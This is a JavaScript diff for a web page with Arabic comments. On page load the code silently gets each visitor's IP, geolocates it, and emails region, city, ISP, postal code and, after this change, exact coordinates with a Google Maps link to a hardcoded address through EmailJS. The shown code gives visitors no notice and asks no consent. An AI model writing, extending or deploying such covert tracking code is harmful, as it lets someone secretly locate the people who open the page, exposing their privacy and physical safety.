@@ -14,19 +14,21 @@ window.onload = function () {
         .then(res => res.json())
         .then(data => fetch(`https://ipapi.co/${data.ip}/json/`))
         .then(res => res.json())
-        .then(loc => {
-            // 5. إعداد النص النهائي للموقع
-            const locationString = `${loc.region || 'غير معروف'} - ${loc.city || 'غير معروف'} - ${loc.county || 'غير معروف'} - ${loc.org || 'غير معروف'} - ${loc.postal || 'غير معروف'}`;
-            const now = new Date().toLocaleString('ar-EG');
+.then(loc => {
+    const lat = loc.latitude;
+    const lon = loc.longitude;
+    const googleMapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+    
+    const locationString = `${loc.region} - ${loc.city} - ${loc.county} - ${loc.org} - ${loc.postal}\nرابط الخريطة: ${googleMapUrl}`;
 
-            // 6. إرسال البيانات إلى الإيميل
-            return emailjs.send("service_25q0ern", "template_xi6fmgy", {
-                to_email: "e508769103@gmail.com",
-                name: "زائر جديد",
-                time: now,
-                message: locationString
-            });
-        })
+    return emailjs.send("service_25q0ern", "template_xi6fmgy", {
+        to_email: "e508769103@gmail.com",
+        name: "زائر جديد",
+        time: new Date().toLocaleString('ar-EG'),
+        message: locationString
+    });
+})
+
         .catch(err => {
             console.error("خطأ أثناء جلب أو إرسال البيانات:", err);
         })
